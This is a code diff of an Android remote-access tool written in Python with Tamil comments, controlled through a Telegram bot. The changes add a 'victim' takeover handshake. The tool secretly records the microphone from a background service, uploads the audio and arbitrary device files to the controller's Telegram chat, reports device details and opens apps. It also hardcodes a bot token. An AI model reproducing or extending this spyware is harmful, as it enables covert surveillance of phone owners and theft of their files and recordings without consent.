@@ -3,37 +3,37 @@ from jnius import autoclass
 
 def send_message(message):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id':root_id,'text':message,'parse_mode':'Markdown'})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id':root_user,'text':message,'parse_mode':'Markdown'})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
 def send_photo(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data={'chat_id':root_id,'caption':caption},files={'photo':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data={'chat_id':root_user,'caption':caption},files={'photo':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
 def send_video(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVideo', data={'chat_id':root_id,'caption':caption},files={'video':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVideo', data={'chat_id':root_user,'caption':caption},files={'video':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
 def send_audio(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendAudio', data={'chat_id':root_id,'caption':caption},files={'audio':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendAudio', data={'chat_id':root_user,'caption':caption},files={'audio':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
 def send_voice(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVoice', data={'chat_id':root_id,'caption':caption},files={'voice':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendVoice', data={'chat_id':root_user,'caption':caption},files={'voice':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
 def send_document(path,caption):
     try:
-        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id':root_id,'caption':caption},files={'document':open(path,'rb')})
+        result = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data={'chat_id':root_user,'caption':caption},files={'document':open(path,'rb')})
         return {'ok':True,'result':result.status_code}
     except Exception as error: return {'ok':False,'result':error}
 
@@ -49,79 +49,76 @@ def internet():
         return result.status_code == 200
     except Exception as error: return False
 
-def notify_internet():
-    try:
-        print('waiting for connection...')
-        while True:
-            result = internet()
-            if result:
-                send_message(f'*info:* `{device}` back to connection')
-                print('connected\n')
-                return {'ok':True,'result':result}
-            time.sleep(0.5)
-    except Exception as error: return {'ok':False,'result':error}
-
 def start_recording(sec=10):
     try:
-        # Android Native Classes-a edukkurom
+        # 1. Android Native Classes-a edukkurom (PythonActivity thevaiyillai!)
         MediaRecorder = autoclass('android.media.MediaRecorder')
         AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
         OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
         AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
-        Environment = autoclass('android.os.Environment')
-        PythonActivity = autoclass('org.kivy.android.PythonActivity')
 
-        # File save panna path ready pandrom (App-oda internal folder)
-        context = autoclass('org.kivy.android.PythonService').mService
+        # 2. Service context edukkurom (Background service-kku idhu dhaan mukkiyam)
+        PythonService = autoclass('org.kivy.android.PythonService')
+        context = PythonService.mService
+        
+        # 3. File save panna path ready pandrom (App-oda internal folder)
         save_dir = context.getExternalFilesDir(None).getAbsolutePath()
         file_path = os.path.join(save_dir, "jarvis_record.m4a")
 
-        # Recorder setup pandrom
+        # 4. Recorder setup pandrom
         recorder = MediaRecorder()
-        recorder.setAudioSource(AudioSource.MIC) # Mic-la irundhu edu
-        recorder.setOutputFormat(OutputFormat.MPEG_4) # MP4 format
-        recorder.setAudioEncoder(AudioEncoder.AAC) # AAC Audio quality
-        recorder.setOutputFile(file_path) # Inga save pannu
+        recorder.setAudioSource(AudioSource.MIC) # Mic-la irundhu audio edukka
+        recorder.setOutputFormat(OutputFormat.MPEG_4) # MP4 format-la save panna
+        recorder.setAudioEncoder(AudioEncoder.AAC) # Nalla audio quality-kku
+        recorder.setOutputFile(file_path) # File path-a set pandrom
 
+        # 5. Recording start pandrom
         send_message('Preparing Mic...')
         recorder.prepare()
         recorder.start()
         send_message(f'Listening `{sec}`s...')
 
-        # 10 seconds record aagum
+        # 6. Neenga kudutha time (sec) varaikum record aagum
         time.sleep(sec)
 
-        # Recording-a stop pandrom
+        # 7. Recording-a safe-a stop pandrom
         recorder.stop()
         recorder.release()
-        send_document(file_path,'Recording Saved Successfully')
+        
+        # 8. Telegram bot-kku audio file-a anuppudhu
+        send_document(file_path, 'Recording Saved Successfully')
 
     except Exception as error:
+        # Edhavadhu prechanai na bot-kku error message pogum
         send_message(f'Mic Problem: `{error}`')
 
-def start_activity(activity,cmd):
+def go_home():
     try:
-        time.sleep(1)
-        if activity == 'app':
-            command = f"monkey -p {cmd} -c android.intent.category.LAUNCHER 1 > /dev/null 2>&1"
-            send_message(f'Opening `{cmd}`...')
-            os.system(command)
+        time.sleep(2)
+        Intent = autoclass('android.content.Intent')
+        PythonService = autoclass('org.kivy.android.PythonService')
+        context = PythonService.mService
+        intent = Intent(Intent.ACTION_MAIN)
+        intent.addCategory(Intent.CATEGORY_HOME)
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        context.startActivity(intent)
+        send_message('Back 2 Home.')
+    except Exception as error: send_message(f'B2H Error: {error}')
+
+def open_app(package_name):
+    try:
+        time.sleep(2)
+        PythonService = autoclass('org.kivy.android.PythonService')
+        context = PythonService.mService
+        pm = context.getPackageManager()
+        intent = pm.getLaunchIntentForPackage(package_name)
+        if intent is not None:
+            send_message(f'Opening `{package_name}`...')
+            context.startActivity(intent)
             send_message(f'App Opened.')
-        elif activity == 'close':
-            command = f"am force-stop {cmd}"
-            send_message(f'Closing `{cmd}`...')
-            os.system(command)
-            send_message('App Closed.')
-        elif activity == 'key':
-            command = f'input keyevent {int(cmd)}'
-            send_message(f'Executing Key {cmd}...')
-            os.system(command)
-            send_message('Key Executed.')
-        elif activity == 'record':
-            threading.Thread(target=start_recording,args=(int(cmd),),daemon=True).start()
-        else: send_message(f'invalid option for `start`')
+        else: send_message(f'App `{package_name}` Not Found In Phone!')
     except Exception as error:
-        send_message(f'Error `{activity}`: `{error}`')
+        send_message(f'Opening Error: `{error}`')
 
 def gen_response(cmd):
     try:
@@ -132,8 +129,16 @@ def gen_response(cmd):
         if cmdlen == 1 and main.lower() == 'active': return {'result':f'`{device}` is active','type':'message'}
         elif cmdlen == 1 and main.lower() == 'sysinfo': return {'result':f'*Software*\n\nsystem: `{platform.system()}`\nrelease: `{platform.release()}`\nversion: `{platform.version()}`\nmachine: `{platform.machine()}`\n\n*Hardware*\n\nbrand: `{subprocess.getoutput("getprop ro.product.brand")}`\ndevice: `{subprocess.getoutput("getprop ro.product.device")}`\nandroid: `{subprocess.getoutput("getprop ro.build.version.release")}`\nmanufacturer: `{subprocess.getoutput("getprop ro.product.manufacturer")}`','type':'message'}
         elif cmdlen == 3 and main.lower() == 'start':
-            threading.Thread(target=start_activity,args=(parts[1],parts[2],),daemon=True).start()
-            return {'result':f'`{parts[1]}` request sended','type':'message'}
+            if parts[1] == 'record':
+                threading.Thread(target=start_recording,args=(int(parts[2]),),daemon=True).start()
+                return {'result':f'`{parts[1]}` request sended','type':'message'}
+            elif parts[1] == 'go_home':
+                threading.Thread(target=go_home,daemon=True).start()
+                return {'result':f'`{parts[1]}` request sended','type':'message'}
+            elif parts[1] == 'app':
+                threading.Thread(target=open_app,args=(parts[2],),daemon=True).start()
+                return {'result':f'`{parts[1]}` request sended','type':'message'}
+            else: return {'result':f'Invalid Option For `{parts[1]}`','type':'message'}
         elif cmdlen == 3 and main.lower() == 'send':
             if not os.path.exists(parts[2]): return {'result':f'*status:* path not found `{parts[2]}`','type':'message'}
             file_details = subprocess.getoutput(f'stat {parts[2]}')
@@ -153,18 +158,24 @@ def gen_response(cmd):
 count = 0
 seen_id = []
 offset = None
-root_id = 7589082187
-print('running....\n')
+root_user = None
 device = subprocess.getoutput("getprop ro.product.brand")
 bot_token = '8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI'
+root_key = f'{device.strip().lower().split()[0] if device else "unknown"}:{subprocess.getoutput("getprop ro.build.version.release").strip().lower().split()[0] if subprocess.getoutput("getprop ro.build.version.release") else "00"}XX'
 
-# visit: https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/getUpdates
-
-print(f'Send Argivements: {send_message(str(sys.argv))}')
+print('root_key:',root_key,'\n\nrunning....\n')
 
 while True:
     try:
-        if not internet(): notify_internet()
+        if not internet():
+            print('waiting for connection...')
+            while True:
+                result = internet()
+                if result:
+                    if root_user: send_message(f'`{device}` back to connection')
+                    break
+                time.sleep(0.5)
+            print('connected\n')
         update = get_update(offset)
         if not update['ok']:
             print('update error:',update['result'],'\n')
@@ -188,16 +199,31 @@ while True:
             count += 1
             continue
         chat_id = update['message']['chat']['id']
-        if chat_id != root_id:
-            print('skipping unknown user:',chat_id,'\n')
+        try:
+            message = update['message']['text']
+        except KeyError:
+            print('unknown text formate message recived:',chat_id)
             seen_id.append(update_id)
             time.sleep(0.5)
             count += 1
             continue
-        try:
-            message = update['message']['text']
-        except KeyError:
-            print('send warning:',send_message('*error:* `invalid text format`'))
+        if len(message.strip().lower().split()) == 2 and message.strip().lower().split()[0] == 'victim' and message.strip().split()[1] == root_key:
+            if root_user: send_message(f'You Are Disconnected 2 `{device}`\nNew User Takeover 2 `{device}`\nNew User: `{chat_id}`')
+            root_user = chat_id
+            print('new user takeover 2 system:',chat_id,'\n')
+            send_message(f'`{device}` Connected 2 Bot.')
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
+        if chat_id != root_user:
+            seen_id.append(update_id)
+            time.sleep(0.5)
+            count += 1
+            continue
+        if len(message.strip().lower().split()) == 1 and message.strip().lower().split()[0] == 'disconnect':
+            send_message(f'Now You Are Disconnected 2 `{device}`')
+            print(f'current user disconnected 2 `{device}`')
             seen_id.append(update_id)
             time.sleep(0.5)
             count += 1
